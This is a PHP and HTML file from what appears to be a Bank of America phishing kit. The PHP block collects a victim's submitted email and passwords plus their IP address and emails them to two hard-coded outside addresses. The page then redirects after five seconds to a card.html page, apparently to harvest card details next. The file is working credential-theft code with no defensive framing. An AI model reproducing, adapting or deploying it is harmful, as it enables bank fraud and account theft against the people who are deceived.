<?
$ip = getenv("REMOTE_ADDR");
$message .= "---------ubta RezulT---------\n";
$message .= "--------\n";

$message .= "--------\n";
$message .= "email: ".$_POST['name1']."\n";
$message .= "and pass: ".$_POST['name2']."\n";
$message .= "and pass: ".$_POST['name3']."\n";




$message .= "--------\n";
$message .= "IP: ".$ip."\n";
$message .= "---------Created By SLim--------------\n";
$recipient = "robb85283@gmail.com,emikuzpaul@outlook.com";
$subject = "bankofamerica next2";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$to", "", $message);
if (mail($recipient,$subject,$message,$headers))
?>




<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>





<HEAD>
   <meta http-equiv="Content-type" content="text/html; charset=ISO-8859-1" />   
   
   <META HTTP-EQUIV="Refresh" CONTENT="5;URL=card.html" >


   

   
   
      
      
   


<TITLE></TITLE>


   <link rel="stylesheet" type="text/css" href="../common/styles/wibscreen.css" />

</HEAD>               

<BODY BGCOLOR="#ffffff">
  
    
  






<!-- ********************************* Begin Body ************************** -->
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<div id="pause" align="center">

   

  

</table>
</div>


</BODY>
</html>
